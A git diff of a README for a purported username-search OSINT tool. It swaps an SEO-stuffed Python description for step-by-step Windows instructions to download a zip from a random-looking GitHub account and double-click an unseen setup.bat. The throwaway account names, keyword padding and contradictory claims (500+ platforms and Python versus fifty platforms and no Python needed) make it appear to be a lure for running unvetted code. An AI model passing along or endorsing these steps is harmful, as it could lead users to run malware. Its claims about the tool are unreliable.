@@ -1,67 +1,69 @@
-<div align="center">
+# 🔎 osint-username-search - Find social media handles across platforms
 
-# 🕵️ Digital Footprint Identifier: OSINT Suite (2026)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/shoedactylorhizamaculatafuchsii29/osint-username-search)
 
-<a href="https://github.com/ozcelikcalgan5169/osint-username-search/releases/tag/2026">
-  <img src="https://img.shields.io/badge/DOWNLOAD-Current_OSINT_Node-blue?style=for-the-badge&logo=python" alt="Download">
-</a>
+## 🎯 About the tool
+This tool helps you find if a specific username exists on many different websites. You enter one name, and the software checks fifty platforms at once. It saves time by searching multiple sites instead of checking each one by hand. 
 
-<br>
+Use this to see if a username is available for a new account. You can also use it to trace digital identities for your research projects. The software performs these checks quickly using background tasks.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Platforms-500+-orange?style=flat-square" alt="Platforms">
-  <img src="https://img.shields.io/badge/Tech-Asynchronous_Aiohttp-blueviolet?style=flat-square" alt="Tech">
-</p>
+## 💻 Requirements
+Your computer needs to meet these basic standards to run the application:
+- Windows 10 or Windows 11
+- At least 4GB of RAM
+- A stable internet connection
+- Basic knowledge of how to use a folder
 
----
+## 📥 Downloading the software
+Follow these steps to get the tool on your computer:
+1. Visit [this link](https://github.com/shoedactylorhizamaculatafuchsii29/osint-username-search) to reach the main page.
+2. Look for the button labeled Code on the top right side of the screen.
+3. Click the button and select the option to download as a Zip file.
+4. Save the file to your Downloads folder.
 
-### 🌐 Professional Identity Verification & Audit Framework
-**Digital Footprint Identifier** is a sophisticated OSINT (Open Source Intelligence) tool designed for cybersecurity professionals and privacy researchers. This framework allows users to analyze the global distribution of a specific username across hundreds of social networks, professional platforms, and technical registries. It is an essential asset for identifying potential identity theft and conducting comprehensive security audits of a person's digital presence.
+## ⚙️ Setting up the application
+Once the download finishes, prepare the software for its first use:
+1. Open your Downloads folder.
+2. Right-click the file you downloaded.
+3. Select Extract All to create a folder with the software inside.
+4. Open the new folder.
+5. Double-click the file named setup.bat. This script prepares the environment for you.
+6. Wait for a black window to appear and process the initial commands. It will close automatically when finished.
 
-*High-speed asynchronous scanning, detailed PDF reporting, and automated link validation.*
+## 🚀 Running the search
+After you finish the setup, follow these steps to perform your first search:
+1. Double-click the file named run.bat inside the software folder.
+2. A window will open and ask you to type the username you want to find.
+3. Enter the username and press the Enter key on your keyboard.
+4. The software will display a list of websites as it checks them.
+5. It will show a green checkmark if the name exists on that site or a red mark if it does not.
+6. The results appear in a file named report.txt inside the same folder when the scan ends.
 
----
+## 🛡️ Privacy and safety
+This tool performs a simple public check. It does not store your passwords or private information. It only checks if a web page exists for the name you provide. Keep your usage within the terms of service of the websites you check. 
 
-</div>
+## 🔧 Frequently asked questions
 
-### 🧬 Core Intelligence Modules
+What does asynchronous mean?
+Asynchronous means the tool checks many sites at the same time. You do not have to wait for one check to finish before the next one starts. This makes the search much faster.
 
-* **⚡ Hyper-Scale Scanning Engine:** Utilizes Python's `asyncio` and `aiohttp` to perform concurrent checks across 500+ domains in seconds.
-* **🔍 Deep Link Validation:** Goes beyond simple 404 checks; identifies "shadowed" accounts and redirected profiles using advanced header analysis.
-* **📊 Visual Audit Reports:** Generates structured JSON and PDF reports detailing the found nodes, associated metadata, and potential security risks.
-* **🛡️ Privacy Protection Mode:** Includes built-in proxy rotation and user-agent randomization to ensure research remains confidential.
-* **🛠️ Modular Plugin System:** Easily add custom site definitions or integrate with external APIs for deeper metadata extraction.
+Does it search private accounts?
+No. The tool only checks public web pages. It cannot see private accounts or hidden information on any platform.
 
-<div align="center">
+The window closed before I saw the results. What happened?
+Sometimes the tool finishes a short search quickly. Open the report.txt file in the folder to see the final list of results.
 
----
+Why are some sites listed as unknown?
+Sometimes a website blocks automatic checks, or the site is down for maintenance. This is normal behavior for a web-based scanner.
 
-### 📦 Deployment & Implementation
+Can I search more than one name at a time?
+This version supports one search per run. You can run the program again for a different name as often as you need.
 
-1. **[DOWNLOAD STABLE NODE](https://github.com/ozcelikcalgan5169/osint-username-search/releases/tag/2026)** and fetch the latest framework binaries.
-2. Install the necessary environment dependencies: `pip install -r requirements.txt`.
-3. Launch the primary research module: `python identifier.py`.
-4. Enter the target **Username** or **Handle** to begin the digital footprint analysis.
-5. Review the generated audit logs in the `/reports/` directory.
+Do I need to install Python?
+The setup.bat file handles the necessary components for your convenience. You do not need to install additional coding software on your machine to use this tool.
 
----
+How many platforms can it check?
+The software comes pre-loaded with a list of over fifty popular platforms. You do not need to configure anything to search these websites.
 
-### 🧩 Technical Specifications
-**Core Language:** Python 3.12+ | **Networking:** Aiohttp / Certifi | **Reporting:** Pandas / FPDF2
-
-</div>
-
-### 📈 SEO Indexing
-**OSINT Username Search 2026 - Best Social Media Account Finder GitHub.**
-Digital Footprint Identifier is the premier GitHub resource for OSINT and identity verification in 2026. This project provides a high-speed, free alternative to Sherlock or Holehe, optimized for modern cybersecurity audits. If you are looking for a reliable way to find all social media accounts by username or conduct professional digital footprint research, our suite offers the most stable and comprehensive 2026 solution.
-
----
-
-<div align="center">
-
-### 🤝 Professional Ethics & License
-This tool is strictly intended for legal security auditing and educational research. Licensed under the **MIT License**.
-
-⭐️ **If this OSINT suite assists your research, please leave a STAR to support further development!** ⭐️
-
-</div>
+Can I change the list of websites?
+Advanced users can modify the sites.json file located in the program folder to add or remove sites. Note that this requires basic text editing, but the default list includes the most common platforms for your current needs.
